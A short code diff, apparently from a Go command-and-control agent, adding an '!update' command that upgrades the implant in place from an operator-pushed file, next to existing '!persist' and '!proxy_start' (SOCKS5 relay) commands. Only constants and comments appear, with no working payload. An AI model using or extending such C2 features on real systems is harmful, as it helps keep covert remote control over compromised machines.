@@ -26,6 +26,10 @@ const (
 	// handler/persist_linux.go.
 	C2CmdPersist = "!persist"
 
+	// C2CmdUpdate upgrades the agent in place from a file the operator
+	// pushed with the file manager (Linux only) — see handler/update_linux.go.
+	C2CmdUpdate = "!update"
+
 	// C2CmdProxyStart orders the agent to dial a target and open a dedicated
 	// C2 relay stream (Proxy route) so the C2 can forward SOCKS5 traffic to it.
 	C2CmdProxyStart = "!proxy_start"
